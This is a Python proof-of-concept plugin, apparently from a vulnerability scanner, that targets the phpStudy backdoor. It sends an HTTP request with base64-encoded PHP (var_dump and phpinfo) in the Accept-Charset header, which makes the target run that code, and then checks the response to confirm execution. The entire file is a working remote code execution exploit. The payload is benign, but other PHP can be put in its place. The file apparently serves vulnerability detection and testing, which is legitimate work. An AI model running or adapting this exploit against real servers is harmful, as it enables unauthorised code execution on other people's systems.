#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'phpstudy_backdoor'
        self.keyword = ['phpstudy']
        self.info = 'phpstudy_backdoor'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url
            async with ClientSession() as session:
                # aiohttp-3.6.1 存在bug，在设置proxy情况下，无法设置Accept-Encoding，且默认Accept-Encoding无法触发此漏洞。
                headers = {
                    'Accept-Encoding': 'gzip,deflate',
                    'Accept-Charset': 'dmFyX2R1bXAoJzEyMycpO3BocGluZm8oKTs=',
                }
                async with session.get(url=url, headers=headers) as res:
                    if res!=None :
                        text = str(await res.read())
                        if "string(3) \"" in text:
                            self.flag = 1
                            self.res.append({"info": url, "key": 'phpstudy_backdoor'})